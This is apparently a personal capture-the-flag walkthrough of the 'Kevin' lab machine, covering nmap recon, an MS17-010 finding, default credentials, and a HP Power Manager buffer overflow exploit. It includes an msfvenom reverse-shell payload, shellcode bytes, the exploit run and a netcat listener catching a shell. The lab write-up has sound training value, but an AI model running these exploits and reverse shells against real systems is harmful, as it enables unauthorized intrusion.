# Kevin - Windows - OffSec - Proven Grounds
Completed: July 16, 2026 - 2 hrs.

- References:
- https://medium.com/@ryanchamruiyang/proving-grounds-kevin-walkthrough-by-ryan-cham-7fe485f41f89
- https://securitychud.medium.com/proving-grounds-kevin-6f5b928aa430
- https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py
- https://www.youtube.com/watch?v=QN45-4lQA2E

## Workflow
### Inital Recon
From this initial recon we can see that we are dealing with a windows machine given references to Microsoft Windows. What stands out to me is the service name `Windows 7 Ultimate N 7600 ...` on port 445 (SMB). 
```
nmap -sC -sV -oN inital-nmap 192.168.228.45
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.228.45/index.asp
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-07-15T21:09:06
|_Not valid after:  2027-01-14T21:09:06
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-07-16T21:11:49+00:00
|_ssl-date: 2026-07-16T21:12:04+00:00; 0s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:f0:b6 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-16T21:11:49
|_  start_date: 2026-07-16T21:09:54
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-16T14:11:49-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
```
### Recon cont.
Used nmap script engine to scan for any known vulnerabilities on the target. 
It took about 5 mins to execute but it's interesting to see that it picked up on smb-vuln-ms17-010.
```
nmap --script=vuln 192.168.228.45          
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 17:16 -0400
Nmap scan report for 192.168.228.45
Host is up (0.031s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.228.45
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.228.45:80/index.asp
|     Form id: 
|     Form action: /goform/formLogin
|     
|     Path: http://192.168.228.45:80/index.asp?Message=Invalid user name or password.
|     Form id: 
|_    Form action: /goform/formLogin
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|   /cgi-bin/mj_wwwusr: Majordomo2 Mailing List
|   /cgi-bin/vcs: Mitel Audio and Web Conferencing (AWC)
|   /cgi-bin/ffileman.cgi?: Ffileman Web File Manager
|   /cgi-bin/ck/mimencode: ContentKeeper Web Appliance
|   /cgi-bin/masterCGI?: Alcatel-Lucent OmniPCX Enterprise
|   /cgi-bin/awstats.pl: AWStats
|   /cgi-bin/image/shikaku2.png: TeraStation PRO RAID 0/1/5 Network Attached Storage
|   /cgi-bin2/: Potentially interesting folder
|_  /cgi-bin/: Potentially interesting folder
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
### smb-vuln-ms17-010 attack path
Going through and trying to brute the password, did not find anything. 
```
# Checking for share enumeration and it is password protected and has anonymous login enabled
smbclient -L 192.168.228.45
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.228.45 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

# Attempting to see if any common 
msf auxiliary(scanner/smb/smb_login) > set rhosts 192.168.0.210
rhosts => 192.168.0.210
msf auxiliary(scanner/smb/smb_login) > set smbuser unix
smbuser => unix
msf auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt
pass_file => /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
msf auxiliary(scanner/smb/smb_login) > 
```
### Go back to website
So I was able to login with `admin:admin` but the site itself seems fairly simple. Let's see if there are any context clues - going to the `Help` I can see that this is an `HP Power Manager 4.2 (Build 7)` 
<img width="1254" height="146" alt="image" src="https://github.com/user-attachments/assets/89e9f641-06cc-4daf-be39-4b5461acd29e" />

If metasploit can be avoided, I go ahead and select `10099.py`
```
searchsploit -m 10099
python2 10099.py 192.168.228.45
...
```
### Research for edit to msfvenom 
It appeared to not be giving any response... looking at the code a little more it could be that this is more suited for windows XP than windows 7. I searched specifically `HP Power Manager Administration Universal Buffer Overflow Exploit windows 7` and found this resource to have some more insight:
- Reference: https://github.com/fuzzlove/buffer_overflows/blob/bda9aaa36bd894b3325967f11d2838164e712177/HP_Power_Manager_Administration_Universal_Buffer_Overflow.py#L41
It looks like I should edit the code to include the following set of "bad characters"
The following gets the 
```
I made a copy of 10099.py called edit-10099.py and crafted the payload with msfvenom for my attacker IP. 
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
  LHOST=<my-ip> LPORT=4444 -e x86/alpha_mixed -f c
"Nooboob" 
"\x89\xe1\xda\xce\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"
...
"\x67\x76\x51\x6c\x47\x7a\x6d\x50\x6b\x4b\x79\x70\x52\x55"
"\x67\x75\x6f\x4b\x72\x67\x55\x43\x42\x52\x30\x6f\x50\x6a"
"\x63\x30\x63\x63\x69\x6f\x49\x45\x41\x41")
```
```
# One terminal - if it does not work, need to revert machine to try again.
python2 edit-10099.py 192.168.228.45
HP Power Manager Administration Universal Buffer Overflow Exploit
ryujin __A-T__ offensive-security.com
[+] Sending evil buffer...
HTTP/1.0 200 OK

[+] Done!
[*] Check your shell at 192.168.228.45:4444 , can take up to 1 min to spawn your shell

# Other terminal
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.208] from (UNKNOWN) [192.168.228.45] 49169
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

```
C:\Users>dir C:\ /s /b | findstr /i "proof.txt local.txt flag.txt" 
dir C:\ /s /b | findstr /i "proof.txt local.txt flag.txt" 
C:\Users\Administrator\Desktop\proof.txt
```
